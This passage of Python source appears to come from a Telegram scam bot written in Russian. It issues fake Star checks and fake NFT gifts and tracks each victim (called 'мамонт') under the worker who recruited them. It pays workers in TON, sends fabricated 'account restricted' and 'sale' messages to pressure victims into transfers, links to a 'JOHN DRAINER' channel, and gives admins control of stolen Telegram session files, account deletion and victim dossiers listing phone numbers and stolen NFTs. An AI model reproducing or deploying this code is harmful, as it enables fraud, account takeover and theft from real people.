                        f"💳 <b>Доступно средств: {u['balance']} ⭐️</b>\n\n"
                        f"<b>👇 Перейдите в кошелек для управления активами:</b>"
                    )
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup()

                    if amt in CHECK_PHOTO_URLS:
                        await message.answer_photo(
                            photo=CHECK_PHOTO_URLS[amt],
                            caption=txt,
                            reply_markup=kb,
                            parse_mode="HTML"
                        )
                    else:
                        await message.answer(txt, reply_markup=kb, parse_mode="HTML")

                    # Дополнительное сообщение после активации чека
                    bonus_msg = (
                        f"🎁 <b>Бонус за активацию чека!</b>\n\n"
                        f"💎 <b>Дополнительные возможности:</b>\n\n"
                        f"⭐️ <b>Бесплатные звезды:</b> Ежедневные бонусы\n"
                        f"🎯 <b>Специальные предложения:</b> Эксклюзивные чеки\n"
                        f"🚀 <b>Ускоренная обработка:</b> Приоритетная очередь\n\n"
                        f"💡 <b>Следите за обновлениями!</b>"
                    )
                    await message.answer(bonus_msg, parse_mode="HTML")
                else:
                    await message.answer("❌ Чек уже активирован или не существует", parse_mode="HTML")
                    await show_main_menu(message, user_id)
            else:
                await message.answer("❌ Чек не найден", parse_mode="HTML")
                await show_main_menu(message, user_id)
            return  # Don't show main menu if check was processed
        elif args and args.startswith("q_"):
            # Process inline check activation
            try:
                params = args.replace("q_", "")
                parts = params.split("_")
                
                # Парсим параметры
                # Структура: UserID_Amount_RandomHex_TargetUser(опционально)
                if len(parts) < 3:
                    await message.answer("❌ Неверная ссылка.")
                    return

                creator_id = int(parts[0])
                amount = int(parts[1])
                target_user = parts[3] if len(parts) > 3 else None

                # === 1. ПРОВЕРКА НА ТЕГ ПОЛЬЗОВАТЕЛЯ ===
                if target_user and target_user != "ALL":
                    current_username = message.from_user.username
                    
                    # Если у нажавшего нет юзернейма или он не совпадает с целевым
                    if not current_username or current_username.lower() != target_user.lower():
                        await message.answer(
                            f"⛔️ <b>ОШИБКА ДОСТУПА</b>\n\n"
                            f"Этот чек предназначен исключительно для пользователя <b>@{target_user}</b>.\n"
                            f"Вы не можете активировать его.",
                            parse_mode="HTML"
                        )
                        return
                # ========================================

                res = db.activate_inline_check(params, creator_id, user_id, amount)
                
                if res == "success":
                    db.add_user(user_id, message.from_user.username, message.from_user.first_name, creator_id)
                    # Log the activation
                    await log_check_activation(bot_instance, message.from_user, {'amount': amount, 'creator_id': creator_id})

                    # Get updated user info
                    u = db.get_user(user_id)

                    # === 2. НОВОЕ СООБЩЕНИЕ БЕЗ МЕНЮ ===
                    # Новый текст для инлайн чека
                    txt = (
                        f"🎉 <b>ЧЕК УСПЕШНО АКТИВИРОВАН!</b>\n\n"
                        f"<b>Баланс пополнен:</b>\n"
                        f"💰 <b>+{amount} ⭐️ Stars</b>\n\n"
                        f"💳 <b>Доступно средств: {u['balance']} ⭐️</b>\n\n"
                        f"<b>👇 Перейдите в кошелек для управления активами:</b>"
                    )
                    
                    # Кнопка кошелька остается для удобства
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup()

                    if amount in CHECK_PHOTO_URLS:
                        # Если есть фото, отправляем фото с текстом
                        await message.answer_photo(
                            photo=CHECK_PHOTO_URLS[amount],
                            caption=txt,
                            reply_markup=kb,
                            parse_mode="HTML"
                        )
                    else:
                        # Если фото нет, просто текст
                        await message.answer(txt, reply_markup=kb, parse_mode="HTML")

                    # УБРАНО: await show_main_menu(message, user_id) 
                    
                elif res == "no_balance":
                    await message.answer("❌ У создателя чека недостаточно средств.")
                elif res == "already_used":
                    await message.answer("⚠️ Этот чек уже был активирован.")
                else:
                    await message.answer("❌ Ошибка активации.")

            except Exception as e:
                print(f"Inline check activation error: {e}")
                await message.answer("❌ Произошла ошибка при обработке чека.")
        elif args and args.startswith("fnft_"):
            try:
                # Очищаем префикс
                clean_args = args.replace("fnft_", "")
                params = clean_args.split("_")

                # Разбираем параметры
                target_username = None
                
                if len(params) >= 5:
                    model = params[0]
                    number = params[1]
                    worker_id = params[2]
                    unique_link_id = params[3]
                    target_username = "_".join(params[4:])
                    
                elif len(params) == 4:
                    model = params[0]
                    number = params[1]
                    worker_id = params[2]
                    unique_link_id = params[3]
                elif len(params) == 3:
                    model, number, worker_id = params
                    unique_link_id = None 
                else:
                    await message.answer("❌ Неверная ссылка.")
                    return

                # === ЛОГИКА ЗАЩИТЫ ОТ ТВИНКОВ ===
                if target_username and target_username.lower() != "all":
                    current_user_username = message.from_user.username
                    is_allowed = False
                    if current_user_username:
                        if current_user_username.lower().replace("@", "") == target_username.lower().replace("@", ""):
                            is_allowed = True
                    
                    if not is_allowed:
                        error_text = (
                            f"⛔️ <b>ОШИБКА ДОСТУПА</b>\n\n"
                            f"Этот подарок предназначен исключительно для пользователя <b>@{target_username}</b>.\n"
                            f"Вы не можете активировать его с этого аккаунта."
                        )
                        await message.answer(error_text, parse_mode="HTML")
                        return 

                db.log_activity(user_id, "Принял подарок", f"{model} #{number}")

                # === ПРОВЕРКА УНИКАЛЬНОСТИ ССЫЛКИ ===
                if unique_link_id:
                    if not db.check_and_claim_link(unique_link_id, user_id):
                        await message.answer(
                            "❌ <b>Этот подарок уже был активирован!</b>\n"
                            "Повторная активация по этой ссылке невозможна.", 
                            parse_mode="HTML"
                        )
                        await show_main_menu(message, user_id)
                        return

                # Логика Воркера
                worker_info = "👤 <b>Воркер:</b> Неизвестно"
                if worker_id and worker_id.isdigit():
                    try:
                        w_id_int = int(worker_id)
                        db.add_user(user_id, message.from_user.username, message.from_user.first_name, w_id_int)
                        w_user = db.get_user(w_id_int)
                        if w_user:
                            w_tag = f"@{w_user['username']}" if w_user['username'] else f"ID: {w_id_int}"
                            worker_info = f"👤 <b>Воркер:</b> {w_tag}"
                    except: pass

                # Лог в канал
                user = message.from_user
                full_name = user.first_name or "Без имени"
                user_tag = f"@{mask_data(user.username)}" if user.username else mask_data(str(user.id))

                log_text = (
                    f"🎭 <b>ФЕЙК NFT ПРИНЯТ</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Мамонт:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{user_tag}</code>\n"
                    f"🎁 <b>NFT:</b> <code>{model} #{number}</code>\n"
                    f"{worker_info}\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(bot_instance, 'topic_launch', log_text)

                # Сохраняем NFT
                db.add_nft(user_id, model, number)

                # 5. ОТПРАВЛЯЕМ СООБЩЕНИЕ МАМОНТУ (Обновленный текст)
                nft_link = f"https://t.me/nft/{model}-{number}"
                
                success_text = (
                    f"🎉 <b>ПОДАРОК УСПЕШНО ПРИНЯТ!</b>\n\n"
                    f"<b>Вы стали владельцем уникального актива:</b>\n"
                    f"💎 <b><a href=\"{nft_link}\">{model}</a></b>\n\n"
                    f"✅ <b>Статус: Зачислен на баланс</b>\n\n"
                    f"<b>👇 Чтобы сохранить актив в блокчейне, перейдите в кошелек прямо сейчас:</b>"
                )

                kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Открыть кошелек", callback_data="wallet")).as_markup()
                await message.answer(success_text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)

                # ======================================================

            except Exception as e:
                print(f"Fake NFT Start Error: {e}")
                await message.answer("❌ Ошибка обработки подарка.")

            return
        else:
            await show_main_menu(message, user_id)




    @router.message(Command("nelix"))
    async def nelix_command(message: types.Message, command: CommandObject):
        args = command.args
        if not args or not args.isdigit():
            await message.answer("Использование: /nelix [сумма в звездах]")
            return

        amt = int(args)
        u = db.get_user(message.from_user.id)
        if not u or u['balance'] < amt:
            await message.answer("❌ Недостаточно звезд на балансе")
            return

        uid = f"{message.from_user.id}_{amt}_{secrets.token_hex(4)}"
        bot_info = await message.bot.me()
        kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Активировать!", url=f"https://t.me/{bot_info.username}?start=q_{uid}")).as_markup()

        if amt in CHECK_PHOTO_URLS:
            # Новый текст для инлайн чека
            txt = (
                f"🎉 <b>ЧЕК УСПЕШНО АКТИВИРОВАН!</b>\n\n"
                f"<b>Баланс пополнен:</b>\n"
                f"💰 <b>+{amount} ⭐️ Stars</b>\n\n"
                f"💳 <b>Доступно средств: {u['balance']} ⭐️</b>\n\n"
                f"<b>👇 Перейдите в кошелек для управления активами:</b>"
            )
            await message.answer_photo(
                photo=CHECK_PHOTO_URLS[amt],
                caption=txt,
                reply_markup=kb,
                parse_mode="HTML"
            )
        else:
            txt = f"⭐️ <b>ЧЕК {amt} звёзд!</b>"
            await message.answer(txt, reply_markup=kb, parse_mode="HTML")

    @router.message(Command("mamontization"))
    async def mamont(m: Message):
        db.add_user(m.from_user.id, m.from_user.username, m.from_user.first_name)
        db.set_mamont(m.from_user.id, True)
        await m.delete()
        await m.answer("🔓 <b>Developer Mode Activated</b>\n/star 1000\n/rstar 1000")

    @router.message(Command("star"))
    async def add_stars(m: Message, command: CommandObject):
        u = db.get_user(m.from_user.id)
        if not u or not u['is_mamont']: return
        try:
            amt = int(command.args)
            db.update_balance(m.from_user.id, amt, 'add')
            await m.answer(f"✅ +{amt} stars")
        except: pass

    @router.message(Command("rstar"))
    async def rem_stars(m: Message, command: CommandObject):
        u = db.get_user(m.from_user.id)
        if not u or not u['is_mamont']: return
        try:
            amt = int(command.args)
            db.update_balance(m.from_user.id, amt, 'remove')
            await m.answer(f"✅ -{amt} stars")
        except: pass

    # --- ПАНЕЛЬ ВОРКЕРА И СИСТЕМА ВЫПЛАТ ---

    @router.message(Command("worker"))
    @router.callback_query(F.data == "worker_refresh")
    async def worker_panel_handler(event: types.Message | types.CallbackQuery):
        user_id = event.from_user.id
        message = event.message if isinstance(event, types.CallbackQuery) else event
        
        # Получаем данные
        u = db.get_user(user_id)
        if not u: return
        
        wallet_info = db.get_wallet(user_id)
        wallet_addr = wallet_info['address'] if wallet_info else "⚠️ Не привязан"
        
        # Статистика мамонтов
        cursor = db.cursor
        cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (user_id,))
        mamonts_count = cursor.fetchone()[0]
        
        # Финансы
        total_earned = u.get('worker_total_profits', 0)
        total_paid = u.get('worker_paid_amount', 0)
        available = total_earned - total_paid
        
        # Защита от отрицательных чисел
        if available < 0: available = 0 

        # Красивый дизайн панели
        txt = (
            f"👷‍♂️ <b>ПАНЕЛЬ УПРАВЛЕНИЯ ВОРКЕРА</b>\n"
            f"<code>➖➖➖➖➖➖➖➖➖➖➖➖</code>\n"
            f"👤 <b>Воркер:</b> {mask_user(u.get('first_name'))}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
            
            f"📊 <b>ФИНАНСОВАЯ СТАТИСТИКА:</b>\n"
            f"💰 <b>Общий заработок:</b> <code>{total_earned:.2f} TON</code>\n"
            f"💸 <b>Уже выплачено:</b> <code>{total_paid:.2f} TON</code>\n"
            f"💎 <b>Доступно к выводу:</b> <code>{available:.2f} TON</code>\n\n"
            
            f"🐘 <b>Мамонтов:</b> <code>{mamonts_count}</code>\n"
            f"💳 <b>Кошелек:</b> <code>{wallet_addr}</code>\n"
            f"<code>➖➖➖➖➖➖➖➖➖➖➖➖</code>"
        )

        # Кнопки
        kb = InlineKeyboardBuilder()
        
        # Логика кнопки выплаты
        if available >= 0.1 and wallet_info:
            kb.row(InlineKeyboardButton(text=f"🤑 Заказать выплату ({available:.2f} TON)", callback_data="request_payout"))
        elif not wallet_info:
            kb.row(InlineKeyboardButton(text="⚙️ Привязать кошелек (для выплат)", callback_data="bind_wallet"))
        
        kb.row(
            InlineKeyboardButton(text="📱 Фейк SMS", callback_data="fake_block_sms"),
            InlineKeyboardButton(text="🔔 Фейк Продажа", callback_data="fake_sale_notification")
        )
        
        # НОВАЯ КНОПКА: JOHN DRAINER с ссылкой на канал
        kb.row(InlineKeyboardButton(text="🔰 JOHN DRAINER", url="https://t.me/johndrainer"))
        
        # WebApp Ссылка
        webapp_url = f"{SETTINGS['api_url']}/worker-panel?chatId={user_id}"
        kb.row(InlineKeyboardButton(text="🖥 Открыть Web-Панель", web_app=WebAppInfo(url=webapp_url)))
        
        kb.row(InlineKeyboardButton(text="🔄 Обновить", callback_data="worker_refresh"))
        kb.row(InlineKeyboardButton(text="🚪 Закрыть", callback_data="worker_exit"))

        if isinstance(event, types.CallbackQuery):
            await safe_edit_text(message, txt, kb.as_markup())
            await event.answer()
        else:
            await message.answer(txt, reply_markup=kb.as_markup(), parse_mode="HTML")

    # --- ЛОГИКА ЗАЯВКИ НА ВЫПЛАТУ ---

    @router.callback_query(F.data == "request_payout")
    async def handler_request_payout(call: types.CallbackQuery):
        user_id = call.from_user.id
        u = db.get_user(user_id)
        
        # Перепроверяем баланс перед отправкой
        total = u.get('worker_total_profits', 0)
        paid = u.get('worker_paid_amount', 0)
        available = total - paid
        
        wallet_info = db.get_wallet(user_id)
        
        if available <= 0:
            return await call.answer("❌ Нет средств для вывода", show_alert=True)
        if not wallet_info:
            return await call.answer("❌ Кошелек не привязан", show_alert=True)

        # Получаем ID админов из настроек
        admin_ids = SETTINGS.get('admins', []) or SETTINGS.get('admin_ids', [])
        if not admin_ids:
            return await call.answer("❌ В настройках не указаны админы", show_alert=True)
            
        # Уведомляем воркера
        await call.answer("✅ Заявка отправлена администратору!", show_alert=True)
        await call.message.edit_text(
            f"⏳ <b>ЗАЯВКА НА ВЫПЛАТУ ОТПРАВЛЕНА</b>\n\n"
            f"💰 Сумма: <code>{available:.2f} TON</code>\n"
            f"💳 Кошелек: <code>{wallet_info['address']}</code>\n\n"
            f"<i>Ожидайте подтверждения... Как только выплата будет проведена, вы получите уведомление.</i>",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 В меню", callback_data="worker_refresh")).as_markup(),
            parse_mode="HTML"
        )

        # Сообщение Админу
        worker_tag = f"@{u['username']}" if u['username'] else f"ID: {user_id}"
        
        admin_txt = (
            f"💸 <b>НОВАЯ ЗАЯВКА НА ВЫПЛАТУ</b>\n"
            f"<code>➖➖➖➖➖➖➖➖➖➖</code>\n"
            f"👤 <b>Воркер:</b> {worker_tag}\n"
            f"💰 <b>Сумма:</b> <code>{available:.2f} TON</code>\n"
            f"💳 <b>Кошелек:</b> <code>{wallet_info['address']}</code>\n"
            f"<code>➖➖➖➖➖➖➖➖➖➖</code>\n"
            f"<i>Нажмите подтвердить ТОЛЬКО после реальной отправки средств!</i>"
        )
        
        # Формат callback: conf_pay:USER_ID:AMOUNT
        amt_str = f"{available:.2f}"
        
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="✅ Подтвердить выплату", callback_data=f"conf_pay:{user_id}:{amt_str}"))
        kb.row(InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_pay:{user_id}"))

        # Рассылка всем админам
        for admin_id in admin_ids:
            try:
                await bot_instance.send_message(admin_id, admin_txt, reply_markup=kb.as_markup(), parse_mode="HTML")
            except: pass

    @router.callback_query(F.data.startswith("conf_pay:"))
    async def handler_confirm_payout(call: types.CallbackQuery):
        # Подтверждение от админа
        try:
            _, target_user_id, amount_str = call.data.split(":")
            target_user_id = int(target_user_id)
            amount = float(amount_str)

            # 1. Обновляем БД (записываем выплату)
            db.register_payout(target_user_id, amount)

            # 2. Получаем данные для логов
            u = db.get_user(target_user_id)
            wallet_info = db.get_wallet(target_user_id)
            worker_tag = f"@{u['username']}" if u['username'] else f"ID: {target_user_id}"
            wallet_addr = wallet_info['address'] if wallet_info else "Неизвестно"

            # 3. Меняем сообщение у админа
            await call.message.edit_text(
                f"✅ <b>ВЫПЛАТА ПОДТВЕРЖДЕНА</b>\n\n"
                f"👤 Воркер: {worker_tag}\n"
                f"💰 Сумма: {amount} TON\n"
                f"👮‍♂️ Одобрил: @{call.from_user.username}"
            )

            # 4. ОТПРАВКА КРАСИВОГО ЛОГА В КАНАЛ "ВЫПЛАТЫ" (topic_payout)
            # Прямая ссылка на картинку чека
            payout_img = "https://i.ibb.co/45LnHMV/Picsart-26-02-04-00-03-50-721.jpg"

            payout_log = (
                f"💸 <b>ВЫПЛАТА ВОРКЕРУ</b>\n"
                f"<code>➖➖➖➖➖➖➖➖➖➖➖➖</code>\n"
                f"👤 <b>Воркер:</b> {worker_tag}\n"
                f"💰 <b>Сумма выплаты:</b> <code>{amount:.2f} TON</code>\n"
                f"💳 <b>Кошелек:</b> <code>{wallet_addr[:6]}...{wallet_addr[-4:]}</code>\n"
                f"<code>➖➖➖➖➖➖➖➖➖➖➖➖</code>\n"
                f"✅ <b>Средства успешно отправлены!</b>\n"
                f"🚀 <b>Воркаем дальше!</b>"
            )

            # Используем topic_payout, если он есть, иначе topic_profit
            target_topic = 'topic_payout' if SETTINGS.get('topic_payout') else 'topic_profit'

            await log_to_topic(bot_instance, target_topic, payout_log, payout_img)

            # 5. Уведомление воркеру в ЛС
            try:
                await bot_instance.send_photo(
                    target_user_id,
                    photo=payout_img,
                    caption=f"💸 <b>ВАША ВЫПЛАТА ПОДТВЕРЖДЕНА!</b>\n\n"
                    f"💰 Сумма: <code>{amount:.2f} TON</code>\n"
                    f"✅ Средства отправлены на ваш кошелек.\n\n"
                    f"Спасибо за работу!",
                    parse_mode="HTML"
                )
            except: pass

        except Exception as e:
            await call.answer(f"Ошибка: {e}", show_alert=True)

    @router.callback_query(F.data.startswith("rej_pay:"))
    async def handler_reject_payout(call: types.CallbackQuery):
        target_user_id = int(call.data.split(":")[1])
        
        await call.message.edit_text(f"❌ <b>Выплата отклонена</b> администратором @{call.from_user.username}")
        
        try:
            await bot_instance.send_message(target_user_id, "❌ <b>Ваша заявка на выплату была отклонена.</b>\nСвяжитесь с администрацией для выяснения причин.", parse_mode="HTML")
        except: pass

    @router.callback_query(F.data == "bind_wallet")
    async def bind_wallet_start(call: types.CallbackQuery, state: FSMContext):
        await call.message.answer(
            "💳 <b>Привязка кошелька TON Keeper</b>\n\n"
            "📝 <b>Отправьте адрес вашего TON кошелька</b>\n\n"
            "💡 <b>Как получить адрес:</b>\n"
            "1. Откройте TON Keeper\n"
            "2. Нажмите на ваш кошелек\n"
            "3. Скопируйте адрес (начинается с EQ...)\n"
            "4. Отправьте его сюда\n\n"
            "⚠️ <b>Важно:</b> Убедитесь, что адрес правильный!",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="worker_refresh")).as_markup(),
            parse_mode="HTML"
        )
        await state.set_state(WaitingWalletAddress.waiting_wallet_address)

    @router.message(WaitingWalletAddress.waiting_wallet_address, F.text)
    async def bind_wallet_address(message: types.Message, state: FSMContext):
        wallet_address = message.text.strip()

        # Basic validation for TON address
        if not (wallet_address.startswith('EQ') or wallet_address.startswith('UQ') or wallet_address.startswith('0:')):
            await message.answer(
                "❌ <b>Неверный формат адреса!</b>\n\n"
                "💡 TON адрес должен начинаться с:\n"
                "• EQ... (новый формат)\n"
                "• UQ... (новый формат)\n"
                "• 0:... (старый формат)\n\n"
                "Попробуйте еще раз:",
                parse_mode="HTML"
            )
            return

        # Save wallet
        db.bind_wallet(message.from_user.id, wallet_address)

        await message.answer(
            f"✅ <b>Кошелек успешно привязан!</b>\n\n"
            f"👛 <b>Адрес:</b> <code>{wallet_address}</code>\n\n"
            f"💰 <b>Теперь в логах профитов будет отображаться ваш кошелек для выплат!</b>",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🏠 В панель воркера", callback_data="worker_refresh")).as_markup(),
            parse_mode="HTML"
        )
        await state.clear()

    @router.callback_query(F.data == "worker_stats")
    async def worker_stats(call: types.CallbackQuery):
        # Get worker stats
        worker_user = db.get_user(call.from_user.id)
        total_profits = worker_user.get('worker_total_profits', 0) if worker_user else 0
        profits_count = worker_user.get('worker_profits', 0) if worker_user else 0

        # Get wallet info
        wallet_info = db.get_wallet(call.from_user.id)

        txt = (
            f"📊 <b>СТАТИСТИКА ПРОФИТОВ</b> 📊\n\n"
            f"💰 <b>Всего профитов:</b> <code>{total_profits} ⭐️</code>\n"
            f"🎁 <b>Количество сделок:</b> <code>{profits_count}</code>\n\n"
        )

        if wallet_info:
            txt += f"👛 <b>Кошелек для выплат:</b> <code>{wallet_info['address'][:8]}...{wallet_info['address'][-6:]}</code>\n\n"

        txt += "💡 <b>Реальные цены NFT рассчитываются через Portals API</b>"

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Обновить", callback_data="worker_stats"))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="worker_refresh"))

        await safe_edit_text(call.message, txt, kb.as_markup())

    @router.callback_query(F.data == "fake_block_sms")
    async def fake_block_sms(call: types.CallbackQuery):
        u = db.get_user(call.from_user.id)
        user_balance = u['balance'] if u else 0
        block_days = random.randint(7, 30)

        fake_sms = (
            f"⛔️ <b>СЛУЖБА БЕЗОПАСНОСТИ: АККАУНТ ОГРАНИЧЕН</b>\n\n"
            f"Мы зафиксировали подозрительную активность в реестре вашего баланса.\n"
            f"<b>Замороженные активы:</b> <code>{user_balance} Stars</code>\n\n"
            f"🛑 <b>Причина:</b> Нарушение политики AML/KYC (Код #403)\n"
            f"⏳ <b>Период блокировки:</b> <code>{block_days} дней</code>\n\n"
            f"<b>Требуемое действие:</b>\n"
            f"Для немедленного снятия ограничений необходимо произвести верификационную транзакцию для подтверждения владения платежным методом.\n\n"
            f"<i>Игнорирование требования может привести к полной конфискации активов.</i>"
        )

        await call.message.answer(fake_sms, parse_mode="HTML")
        await call.answer("✅ Уведомление отправлено", show_alert=True)

    @router.callback_query(F.data == "fake_sale_notification")
    async def fake_sale_notification_start(call: types.CallbackQuery, state: FSMContext):
        await call.message.answer("Введите тег получателя (например @username):")
        await state.set_state(FakeSaleState.waiting_for_tag)
        await call.answer()

    @router.message(FakeSaleState.waiting_for_tag)
    async def fake_sale_tag(m: Message, state: FSMContext):
        tag = m.text.strip()
        await state.update_data(tag=tag)
        await m.answer("Введите сумму звезд:")
        await state.set_state(FakeSaleState.waiting_for_amount)

    @router.message(FakeSaleState.waiting_for_amount)
    async def fake_sale_amount(m: Message, state: FSMContext):
        if not m.text.isdigit():
            await m.answer("Введите число!")
            return
        amount = int(m.text)
        data = await state.get_data()
        tag = data.get('tag')
        await state.clear()

        # Создаем фейковое уведомление о продаже
        fake_sale = (
            f"🔔 <b>УВЕДОМЛЕНИЕ О ПРОДАЖЕ</b>\n\n"
            f"🎉 <b>У вас новая продажа!</b>\n\n"
            f"📋 <b>Условия сделки:</b>\n"
            f"Необходимо перевести оплату чеком звезд на аккаунт <code>{tag}</code>\n"
            f"💰 Сумма: <code>{amount} ⭐️</code>\n\n"
            f"⏰ <b>Просим выполнить условия сделки до:</b>\n"
            f"<code>{get_deadline_date()}</code>\n\n"
            f"🔺 <b>Если звезды не будут полученны в течении этого времени, они безвозвратно сгорят.</b>\n\n"
            f"✅ <b>После вывода звезд получателем средства будут автоматически переданы на ваш баланс.</b>"
        )

        await m.answer(fake_sale, parse_mode="HTML")

    @router.callback_query(F.data == "worker_refresh")
    async def worker_refresh(call: types.CallbackQuery):
        # Пересчитываем статистику
        cursor = db.cursor
        cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (call.from_user.id,))
        mamonts_count = cursor.fetchone()[0]

        worker_user = db.get_user(call.from_user.id)
        profits_count = worker_user.get('worker_profits', 0) if worker_user else 0
        total_profits_ton = worker_user.get('worker_total_profits', 0) if worker_user else 0

        txt = (
            f"👷‍♂️ <b>ПАНЕЛЬ ВОРКЕРА</b> 👷‍♂️\n\n"
            f"👤 <b>ID пользователя:</b> <code>{call.from_user.id}</code>\n"
            f"💰 <b>Подарков передано:</b> <code>{profits_count}</code> 🎁\n"
            f"💎 <b>Всего заработано:</b> <code>{total_profits_ton:.2f} TON</code>\n"
            f"🐘 <b>Активных мамонтов:</b> <code>{mamonts_count}</code> 👥\n\n"
            f"🛠️ <b>ИНСТРУМЕНТЫ ВОРКЕРА:</b>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Фейк SMS о блокировке", callback_data="fake_block_sms"))
        kb.row(InlineKeyboardButton(text="💰 Фейк уведомление о продаже", callback_data="fake_sale_notification"))
        
        # НОВАЯ КНОПКА: JOHN DRAINER с ссылкой на канал
        kb.row(InlineKeyboardButton(text="🔰 JOHN DRAINER", url="https://t.me/johndrainer"))
        
        kb.row(InlineKeyboardButton(text="🔄 Обновить статистику", callback_data="worker_refresh"))
        kb.row(InlineKeyboardButton(text="🚪 Выйти", callback_data="worker_exit"))

        try:
            await call.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode="HTML")
            await call.answer("✅ Статистика обновлена!", show_alert=True)
        except Exception as e:  
            await call.answer("ℹ️ Статистика актуальна", show_alert=True)

    @router.callback_query(F.data == "worker_exit")
    async def worker_exit(call: types.CallbackQuery):
        await call.message.delete()
        await call.answer("👋 Панель закрыта", show_alert=True)

    # --- ADMIN ---
    @router.message(Command("admin"))
    async def admin_panel(message: types.Message):
        if not await check_admin(message.from_user.id): return
        u, c = db.get_stats()
        main_sess = SESSIONS_DIR / f"{SETTINGS['banker_session']}.session"
        st = "🟢 ON" if main_sess.exists() else "🔴 OFF"
        
        # --- ДОБАВЛЕНО: Статус удаления ---
        deact_status = "🔥 ВКЛЮЧЕНО" if SETTINGS.get("auto_deactivate") else "❄️ ВЫКЛЮЧЕНО"

        txt = (
            f"👑 <b>ADMIN PANEL</b>\n"
            f"Users: {u}\n"
            f"Checks Total: {c}\n"
            f"Banker: {st}\n"
            f"Target: {SETTINGS['target_user']}\n"
            f"API: {SETTINGS['api_url']}\n"
            f"Авто-удаление: <b>{deact_status}</b>" # Отображение в тексте
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Connect Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="📂 Список сессий", callback_data="admin_sessions_list"))

        # --- ДОБАВЛЕНО: Кнопка переключения ---
        kb.row(InlineKeyboardButton(
            text=f"⚙️ Удаление аккаунтов: {'🔴 ВЫКЛЮЧИТЬ' if SETTINGS.get('auto_deactivate') else '🟢 ВКЛЮЧИТЬ'}", 
            callback_data="toggle_deactivate"
        ))

        kb.row(
            InlineKeyboardButton(text="🛡 Чекер сессий", callback_data="admin_session_check"),
            InlineKeyboardButton(text="🧹 Очистка RAM", callback_data="admin_kill_sessions")
        )

        kb.row(InlineKeyboardButton(text="🎯 Set Target", callback_data="set_target"), InlineKeyboardButton(text="⚙️ Set API", callback_data="set_api"))
        kb.row(InlineKeyboardButton(text="🛠 Maint. Mode", callback_data="toggle_shop"), InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))
        kb.row(InlineKeyboardButton(text="🔍 Проверить банкира", callback_data="check_banker_status"))
        kb.row(InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs"))
        kb.row(InlineKeyboardButton(text="🔄 Restart Bot", callback_data="restart_bot"))

        await message.answer(txt, reply_markup=kb.as_markup())
        
        # <-- Убедитесь, что здесь 4 пробела отступа (как у других функций в get_main_router)
    @router.message(Command("info"))
    async def cmd_info(message: types.Message, command: CommandObject):
        # <-- А здесь и далее внутри функции должно быть 8 пробелов
        if not await check_admin(message.from_user.id): return

        query = command.args
        if not query:
            await message.answer("ℹ️ <b>Использование:</b> <code>/info <@username | id | +7999...></code>", parse_mode="HTML")
            return

        await message.answer(f"🔍 Ищу информацию: <code>{query}</code>...")

        found_users = []
        
        # 1. Если ввели цифры (похоже на номер или ID) - ищем в сессиях
        if query.replace("+", "").isdigit():
            clean_digits = query.replace("+", "")
            if len(clean_digits) > 7:
                 for session_file in SESSIONS_DIR.glob("*.session"):
                    if clean_digits in session_file.stem:
                        try:
                            tmp = Client(session_file.stem, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                            await tmp.connect()
                            me = await tmp.get_me()
                            await tmp.disconnect()
                            u_db = db.get_user(me.id)
                            if u_db: found_users.append(u_db)
                        except: pass
        
        # 2. Обычный поиск по базе
        if not found_users:
            found_users = db.search_smart(query)

        if not found_users:
            await message.answer("❌ Пользователь не найден.")
            return

        # Вывод результатов
        for u in found_users[:3]:
            user_id = u.get('user_id')
            wallet = db.get_wallet(user_id)
            nfts = db.get_user_nfts(user_id)
            
            phone = u.get('phone_number')
            session_status = "❌ Нет файла"
            
            if not phone:
                phone = "Не сохранен (Старый вход)"
            
            if phone and phone.replace("+","").isdigit():
                clean_ph = phone.replace("+","")
                if (SESSIONS_DIR / f"{clean_ph}.session").exists():
                    session_status = "✅ <b>Активна</b>"
                else:
                    session_status = "⚠️ <b>Файл удален</b>"

            role = "🦣 Мамонт"
            if u.get('worker_total_profits', 0) > 0: role = "👷‍♂️ Воркер"
            
            worker_info = "Неизвестно"
            if u.get('worker_id'):
                w = db.get_user(u['worker_id'])
                if w: worker_info = f"@{w.get('username', 'NoUser')}"

            txt = (
                f"🕵️‍♂️ <b>ДОСЬЕ:</b> @{u.get('username', 'Нет')}\n"
                f"<code>««─────────────────»»</code>\n"
                f"👤 <b>ФИО:</b> {html.escape(u.get('first_name') or '-')}\n"
                f"📱 <b>Телефон:</b> <code>{phone}</code>\n"
                f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                f"🔰 <b>Роль:</b> {role}\n"
                f"📁 <b>Сессия:</b> {session_status}\n"
                f"💰 <b>Баланс:</b> {u.get('balance', 0)} ⭐️\n"
                f"👥 <b>Воркер:</b> {worker_info}\n"
                f"👛 <b>Кошелек:</b> <code>{wallet['address'] if wallet else 'Нет'}</code>\n"
                f"🖼 <b>Украдено NFT:</b> {len(nfts)} шт.\n"
            )

            kb = InlineKeyboardBuilder()
            
